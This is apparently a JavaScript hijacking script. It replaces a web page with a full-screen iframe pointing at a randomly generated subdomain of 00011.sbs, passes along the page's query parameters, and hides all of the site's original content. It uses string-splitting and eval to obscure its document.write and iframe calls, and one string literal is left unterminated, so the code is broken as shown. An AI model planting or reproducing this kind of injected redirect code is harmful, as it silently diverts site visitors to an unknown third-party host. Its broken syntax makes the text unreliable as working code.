var titlestr = document.title;

// 生成随机三级域名前缀
function generateRandomSubdomain() {
    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    var result = '';
    for (var i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// 动态处理URL，仅保留参数部分并使用随机三级域名
function getCurrentUrlWithCorrectDomain() {
    var currentUrl = window.location.href;
    var randomSubdomain = generateRandomSubdomain();
    var newDomain = 'https://' + randomSubdomain + '.00011.sbs';
    
    // 提取URL中的查询参数部分（包括?后面的所有内容）
    var queryIndex = currentUrl.indexOf('?');
    var queryParams = queryIndex !== -1 ? currentUrl.substring(queryIndex) : '';
    
    // 构建正确的URL：新域名 + 原查询参数
    return newDomain + queryParams;
}

setFrame(getCurrentUrlWithCorrectDomain());

function setFrame(olink) {
    var ss = '<title>' + titlestr + '</title>\
<div id="showcloneshengxiaon" style="height:100%;width:100%;background:#fff;overflow:hidden;">\
<ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0 frameborder="0" \
width="100%" height="100%" style="border:none;display:block;" src="' + olink + '"></iframe>\
</div>\
<style type="text/css">\
html,body{width:100%;height:100%;margin:0;padding:0;overflow:hidden;}\
</style>';
   var ss = '<meta charset="UTF-8"><title>'+titlestr+'</title>\
    eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
    try {
        setTimeout(function () {
            console.log(document.body.children.length);
            for (var i = 0; i < document.body.children.length; i++) {
                try {
                    var a = document.body.children[i].tagName;
                    var b = document.body.children[i].id;
                    console.log(i + "***" + a + "**" + b);
                    if (b != "iconDiv1" && b != "showcloneshengxiaon" && a != "title") {
                        document.body.children[i].style.display = "non" + "e"
                    }
                } catch (e) { }
            }

            var oMeta = document.createElement('meta');
            oMeta.name = 'viewport';
            oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
            document.getElementsByTagName('head')[0].appendChild(oMeta);

        }, 100)
    } catch (e) { }
}
